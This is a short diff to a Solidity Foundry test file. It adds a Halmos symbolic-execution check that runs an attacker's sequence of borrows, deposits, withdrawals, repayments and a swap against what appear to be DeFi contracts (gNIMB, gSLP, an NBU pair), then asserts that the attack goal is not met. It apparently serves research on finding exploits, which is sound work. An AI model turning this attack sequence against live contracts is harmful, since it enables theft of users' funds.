@@ -441,7 +441,31 @@ contract NMBTestBase is Test, BlockLoader {
         payback_gnimb_pairnbugnimb(amt4);
         swap_pairnbugnimb_attacker_gnimb_nbu(amt5, amt6);
         payback_gnimb_owner(amt7);
-        require(!attackGoal(), "Attack succeed!");
+        require(!attackGoal(), "Attack failed!");
+        vm.stopPrank();
+    }
+
+    function check_gt_halmos(
+        uint256 amt0,
+        uint256 amt1,
+        uint256 amt2,
+        uint256 amt3,
+        uint256 amt4,
+        uint256 amt5,
+        uint256 amt6,
+        uint256 amt7
+    ) public {
+        vm.startPrank(attacker);
+        vm.assume(amt7 >= amt0);
+        vm.assume(amt4 >= amt2);
+        borrow_gnimb_owner(amt0);
+        deposit_gslp_gnimb_gslp(amt1);
+        borrow_gnimb_pairnbugnimb(amt2);
+        withdraw_gslp_gslp_gnimb(amt3);
+        payback_gnimb_pairnbugnimb(amt4);
+        swap_pairnbugnimb_attacker_gnimb_nbu(amt5, amt6);
+        payback_gnimb_owner(amt7);
+        assert(!attackGoal());
         vm.stopPrank();
     }
 }
